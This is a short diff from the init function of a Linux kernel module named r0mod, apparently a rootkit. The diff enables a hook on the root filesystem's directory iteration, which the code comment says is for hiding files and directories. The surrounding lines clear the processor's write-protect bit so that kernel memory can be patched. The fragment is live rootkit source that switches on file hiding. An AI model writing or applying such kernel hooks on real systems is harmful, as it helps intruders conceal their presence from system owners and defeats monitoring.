@@ -329,8 +329,8 @@ static int __init r0mod_init(void)
     //hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
-    //root_iterate = get_vfs_iterate("/");
-    //hijack_start(root_iterate, &n_root_iterate);
+    root_iterate = get_vfs_iterate("/");
+    hijack_start(root_iterate, &n_root_iterate);
 
     write_cr0(read_cr0() & (~0x10000));
 
